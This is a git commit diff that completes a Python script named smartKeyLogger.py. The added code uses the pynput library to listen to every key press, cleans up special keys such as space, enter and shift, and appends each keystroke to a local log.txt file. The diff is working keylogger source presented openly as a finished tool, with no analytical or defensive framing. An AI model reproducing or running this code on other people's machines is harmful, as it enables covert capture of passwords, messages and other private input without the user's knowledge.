7f2188a9059bea54700dd167b2bdffba893f6127
mendis <menda9991@gmail.com>
2025-11-08 20:07:47 +0530

    finshed the keylogger

--- smartKeyLogger.py
+++ smartKeyLogger.py
@@ -1,6 +1,24 @@
 from pynput.keyboard import Listener
 
-with open("log.txt", 'a') as f:
-    f.write("global\n")
+def writeToFile(key):
+  letter = str(key)
+  letter = letter.replace("'","")
+
+  if letter == 'Key.space':
+    letter = ' '
+
+  if letter == 'Key.shift':
+    letter = ''
+
+  if letter == 'Key.shift_r':
+    letter = ''
+
+  if letter == 'Key.enter':
+    letter = "\n"
+
+  with open("log.txt", 'a') as f:
+    f.write(letter)
 
 with Listener(on_press=writeToFile) as l:
+  l.join()
+
